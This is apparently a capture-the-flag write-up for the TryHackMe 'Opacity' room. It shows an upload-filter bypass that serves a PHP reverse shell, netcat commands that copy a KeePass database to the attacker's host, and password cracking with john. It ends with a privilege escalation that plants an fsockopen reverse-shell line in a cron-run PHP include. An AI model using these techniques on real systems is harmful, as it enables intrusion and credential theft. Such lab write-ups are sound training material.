# Opacity

[Opacity](https://tryhackme.com/room/opacity)

## Solution

- nmap scan 22, 80, 139, 445

- feroxbuster `/cloud`

### Uploading Image

1. Start a http server locally `python -m http.server`.
2. Create a revshell.php file with Pentest Monkey. https://www.revshells.com/
3. Go to `/cloud` and enter the url as `http://<host>:8000/revshell.php#.png`.
   This will trick the file upload to think that you upload an image (png
   extenstion), but the http server will respond with the php file.
4. Have a nc listener and you get on the target machine

### www-data

The file `/var/www/html/login.php` actually contains passwords `$logins =
array('admin' => 'oncloud9','root' => 'oncloud9','administrator' =>
'oncloud9');`.

### local.txt

Enumerate with linpeas or other tools + manual. look for interesting
folders/files in `/` and `/var/www`.

- /opt/dataset.kdbx: Keepass password database 2.x KDBX

Send it to the host with the usual on host `nc -lp 8080 > databse.kdbx` on
target `nc <host> 8080 < /opt/dataset.kdbx`.

Convert the file to john format using `keepas2john database.kdbx >
database.txt` and then attempt to crack it with `john database.txt`.
And we get `741852963`. Next we can upload the database.kdbx to
https://app.keeweb.info/ and use the password to get the data. It contains the
credentials for `sysadmin:Cl0udP4ss40p4city#8700`. `ssh sysadmin@<ip>` and
provide the password.

### proof.txt

Enumerate:
- `sudo -l` no sudo permissions
- `find / -perm /4000 -type f 2> /dev/null` nothing unusual
- `crontab -l` no cronjobs
- `/etc/crontab` and all that stuff maybe some interesting cronjob.
- linpeas: ~/scripts/script.php is ran by the root. maybe there is a cronjob.

`script.php` creates a zip of the scripts folder and moves it to /var/backups/.
we can try to unzip the backup in scripts and overwrite `lib` with our code.
`unzip /var/backups/backup.zip -d ~/scripts/ -x script.php`. then we can modify
`lib/backup.inc.php` to add a line that makes a revshell
`$sock=fsockopen("<host>",6969);shell_exec("sh <&3 >&3 2>&3");` on the host we
should run `nc -lvnp 6969`. the flag for root is in /root/proof.txt.
